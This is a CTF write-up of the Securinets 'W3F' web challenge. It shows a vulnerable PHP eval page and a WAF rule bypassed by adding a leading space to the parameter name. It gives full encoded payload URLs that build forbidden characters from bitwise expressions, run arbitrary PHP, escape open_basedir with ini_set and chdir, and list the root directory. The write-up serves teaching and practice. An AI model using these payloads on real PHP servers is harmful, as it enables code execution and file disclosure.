W3F
---

challenge link: http://web2.q21.ctfsecurinets.com:8081/


waf-config file


![image](https://user-images.githubusercontent.com/61080375/112029098-e2038400-8b5e-11eb-97dd-fd1bfacec876.png)

* we can by pass that ``!@within 1`` by putting space("%20" or "+") in fron of the ``cmd`` parameter 


http://web2.q21.ctfsecurinets.com:8081/?+cmd=123


source code:

```php
<?php

error_reporting(0);
function waf($str){
     for($i=0;$i<=strlen($str)-1;$i++){
        if ((ord($str[$i])<32) or (ord($str[$i])>126)){
            header("HTTP/1.1 403 Forbidden" );
                        exit;
        }
     }
     $blacklist = ['[A-Zb-df-km-uw-z]',' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^','~'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        header("HTTP/1.1 403 Forbidden" );
                        exit;
                        //die('You are forbidden!');
                }
        }
}
if(!isset($_GET['cmd'])){
    show_source(__FILE__);
}else{
        $str = $_GET['cmd'];
       
        waf($str);
        eval('echo '.$str.';');
}
?>

```

**char allowed**:``a e v l 1 2 3 4 5 6 7 8 9 0 @ ! # % ^ & * | ( ) _``

* we can get more charcters by combination of these charcters

![image](https://user-images.githubusercontent.com/61080375/112035180-4f1a1800-8b65-11eb-81b1-bed2baf24019.png)



```
(l|v)           =>  ~
(v|e)           =>   w
((2).(2){0}|a)  =>   s
((2).(2)|(9).(9))  =>  ;;

```
```
(((((4)._%26e_).((((9999**999999).a)%7B2%7D)%7C((0%2F0).a)%7B1%7D).((_)%26e).(((0).a%7C(e%26l))%26((_))).(((((2).a)%7Ca)%7C((8).aa))%26((_).aa)).((((1).(2))%7Cl.(9))%26(_))))).((9).a%26(a%7Cl)).((2).(2)%7C(9).(9))  => $_GET[aa]);;  

```

* we can pass ``eval`` also ,so we can exicute php code

* we can try ``eval(phpinfo());``

```css
http://web2.q21.ctfsecurinets.com:8081/?%20cmd=eval((((((1/0).(1)){0})%26(((1/0).(1)){2})|(0).(0){0})).(((((1/0).(1)){0})%26(((1/0).(1)){2})|((0).(0){0})%26(((1.5).(0)){1})|(8).(8){0}%26((1/0).(0)){0})).(((((1/0).(1)){0})%26(((1/0).(1)){2})|(0).(0){0})).(((((1/0).(1)){0})%26(((1/0).(1)){2})|((0).(0){0})%26(((1.5).(0)){1})|(8).(8){0}%26((1/0).(0)){0}|(1).(1){0}%26((0/0).(0)){1})).(((((1/0).(1)){0})%26(((1/0).(1)){2})|((0).(0){0})%26(((1.5).(0)){1})|(8).(8){0}%26((1/0).(0)){0}|(4).(4){0}%26((1/0).(0)){2}|(2).(2){0}%26((1/0).(0)){1})).(((((1/0).(1)){0})%26(((1/0).(1)){2})|((0).(0){0})%26(((1.5).(0)){1})|(4).(4){0}%26((1/0).(0)){2}|(2).(2){0}%26((1/0).(0)){1})).(((((1/0).(1)){0})%26(((1/0).(1)){2})|((0).(0){0})%26(((1.5).(0)){1})|(8).(8){0}%26((1/0).(0)){0}|(4).(4){0}%26((1/0).(0)){2}|(2).(2){0}%26((1/0).(0)){1}|(1).(1){0}%26((0/0).(0)){1})).((((0).(0){0})%26(((1.5).(0)){1})|(8).(8){0}%26((1/0).(0)){0})).((((0).(0){0})%26(((1.5).(0)){1})|(8).(8){0}%26((1/0).(0)){0}|(1).(1){0}%26((0/0).(0)){1})).(((0).(0){0}|(8).(8){0}%26((1/0).(0)){0}|(2).(2){0}%26((1/0).(0)){1}|(1).(1){0}%26((0/0).(0)){1})))
```

![image](https://user-images.githubusercontent.com/61080375/112036748-05cac800-8b67-11eb-8e5d-6336baf0a8ad.png)

![image](https://user-images.githubusercontent.com/61080375/112036858-1f6c0f80-8b67-11eb-9d9e-9edc062715d2.png)


* we can see alot of functions are disabled in that


* we found that ``ini_set()``  is not disabled
* there is a ``/images`` dir 
* the flag location is ``/``
* so we can bypass open_basedir and use finfo to read contents

payload:**ini_set('display_errors', 1);ini_set('display_startup_errors', 1);error_reporting(E_ALL);chdir('images');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir', '/');new Finfo(0,"/");**



```css
http://web2.q21.ctfsecurinets.com:8081/?+cmd=eval(((ev).(al).((8).a%26(l)).((((4)._%26e_).((((9999**999999).a){2})|((0%2F0).a){1}).((_)%26e).(((0).a|(e%26l))%26((_))).(((((2).a)|a)|((8).aa))%26((_).aa)).((((1).(2))|l.(9))%26(_))))).((9).a%26(a|l)).((2).(2)|(9).(9)))&aa=ini_set(%27display_errors%27,%201);ini_set(%27display_startup_errors%27,%201);error_reporting(E_ALL);chdir(%27images%27);ini_set(%27open_basedir%27,%20%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%20%27/%27);new%20Finfo(0,%22/%22);
```



![image](https://user-images.githubusercontent.com/61080375/112038804-4f1c1700-8b69-11eb-90e0-9e368ad0b74f.png)


